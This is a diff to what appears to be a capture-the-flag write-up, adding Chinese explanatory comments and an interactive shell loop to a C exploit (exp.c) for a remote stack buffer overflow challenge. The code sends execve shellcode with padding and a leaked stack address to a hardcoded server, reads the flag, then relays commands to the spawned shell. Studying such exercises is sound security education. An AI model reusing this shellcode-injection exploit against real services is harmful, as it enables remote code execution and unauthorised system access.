@@ -317,14 +317,14 @@ int main()
 
 ```c
 //exp.c
-#include <stdlib.h>
-#include <string.h>
-#include <stdio.h>
+#include <stdlib.h>//malloc, free
+#include <string.h>//strxxx
+#include <stdio.h>//printf scanf
 
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <netinet/in.h>
-#include <unistd.h>
+#include <sys/socket.h>//socket, connect, send, recv
+#include <arpa/inet.h>//inet_pton
+#include <netinet/in.h>//struct sockaddr, struct sockaddr_in
+#include <unistd.h>//close
 
 char shellcode[] =  "\x31\xc0"
 					"\x50"
@@ -337,46 +337,85 @@ char shellcode[] =  "\x31\xc0"
 					"\xb0\x0b"
 					"\xcd\x80";
 
-char *address = "45.248.85.153";//pwn2.jarvisoj.com
+char *address = "45.248.85.153";
 short port = 9877;
 
 int SendPayload(char* payload, int length)
 {
+	/*创建套接字，指定协议族为IPv4，创建字节流套接字，使用TCP协议*/
 	int socketfd = socket(AF_INET, SOCK_STREAM, 0);
 	struct sockaddr_in serverAddr;
 	memset(&serverAddr, 0, sizeof(struct sockaddr_in));
 
+	/*指定连接目标的端口，IP地址*/
 	serverAddr.sin_family = AF_INET;
 	serverAddr.sin_port = htons(port);
 	inet_pton(AF_INET, address, &serverAddr.sin_addr);
 
+	/*三次握手*/
 	int ret = connect(socketfd, (struct sockaddr*)&serverAddr, sizeof(struct sockaddr_in));
 
+	/*打印连接状态，0为成功*/
 	printf("ret code: %d\n",ret);
+
+	/*接收服务器返回的局部变量的地址*/
 	char *buffer = (char*)malloc(1024);
+	memset(buffer, 0, 1024);
 	recv(socketfd, buffer, 1023, 0);
 
-	const char *str = strstr(buffer, "0x");
-	
-	char *pstack = (char*)malloc(9);
-	strncpy(pstack, str+2, 8);
+	/*将字符串形式的数值转为整数*/
+	const char *pstrStart = strstr(buffer, "0x");
 
-	long ptr = strtol(str+2, 0, 16);
+	long pointer = strtol(pstrStart+2, 0, 16);
 	
-	memcpy((char*)(payload+length-5), &ptr, 4);
+	/*将返回地址设为局部变量的地址，此地址即为shellcode开始的地址*/
+	memcpy((char*)(payload+length-5), &pointer, 4);
 
+	/*发送payload*/
 	send(socketfd, payload, length, 0);
 	
-
+	/*此时服务端已运行了一个shell，发送系统命令，查看flag*/
 	const char *command = "cat flag*\n";
 	send(socketfd, command, strlen(command)+1, 0);
-
 	recv(socketfd, buffer, 1023, 0);
 	printf(buffer);
 	fflush(stdout);
+	
+	/*交互式shell*/
+	while(1)
+	{
+		/*接收用户输入的命令*/
+		char *userCommand = (char*)malloc(200);
+		memset(userCommand, 0, 200);
+		printf(">> ");
+		fflush(stdout);
+		scanf("%s", userCommand);
+	
+		/*如果命令是exit则退出*/
+		if(strcmp(userCommand,"exit") == 0)
+		{
+			free(userCommand);
+			break;
+		}
+		
+		/*给命令后面添加换行符*/
+		strcat(userCommand,"\n");
+		
+		/*发送命令*/
+		send(socketfd, userCommand, strlen(userCommand)+1, 0);
+		memset(buffer, 0, 1024);
+		
+		/*接收命令执行结果*/
+		recv(socketfd, buffer, 1023, 0);
+		printf(buffer);
+		fflush(stdout);
+		free(userCommand);
+	}
+
 
 	free(buffer);
-	free(pstack);
+	
+	/*关闭连接*/
 	close(socketfd);
 	
 	return 0;
@@ -386,24 +425,30 @@ int SendPayload(char* payload, int length)
 
 int main()
 {
+	/*生成填充用的字节，长度为 （局部变量空间大小+原EBP的数据的四个字节）- shellcode的长度*/
 	int paddingLength = 0x88+0x4 - strlen(shellcode);
 	char *padding = (char*)malloc(paddingLength+1);
 	memset(padding, 'A', paddingLength);
 	padding[paddingLength] = '\0';
 
 	
+	/*将shellcode和填充字节连接，生成payload*/
 	int payloadLength = strlen(shellcode) + paddingLength + 4 + 1;
 	char *payload = (char*)malloc(payloadLength);
 	strcpy(payload, shellcode);
 	strcat(payload, padding);
 
-	printf("sendding payload...\n");	
+	printf("sendding payload...\n");
+
+	/*发送payload*/
 	SendPayload(payload, payloadLength);
 
+	/*将malloc申请的内存进行释放*/
 	free(padding);
 	free(payload);
 	return 0;
 }
+
 
 
 ```
